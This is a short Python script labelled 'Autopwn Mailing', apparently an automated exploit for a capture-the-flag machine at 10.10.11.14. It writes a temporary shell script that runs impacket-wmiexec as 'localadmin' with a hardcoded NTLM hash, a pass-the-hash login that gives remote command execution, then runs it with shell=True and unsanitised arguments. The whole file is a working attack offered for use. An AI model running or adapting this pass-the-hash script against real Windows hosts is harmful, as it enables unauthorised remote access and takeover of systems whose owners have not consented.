import os
import sys
import subprocess
import string
import random
import time

print("\n[\033[1;32m+\033[1;37m] Autopwn Mailing ~ Ninhpn1337 \n")

bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
bashfile='/tmp/'+bashfile+'.sh'


f = open(bashfile, 'w')
time.sleep(2)
s = """ echo " [+] Trying to reach adminlocal.....";
echo " " 
sleep 3
impacket-wmiexec localadmin@10.10.11.14 -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae;

"""

f.write(s)
f.close()
os.chmod(bashfile, 0o755)
bashcmd=bashfile
for arg in sys.argv[1:]:
  bashcmd += ' '+arg
subprocess.call(bashcmd, shell=True)
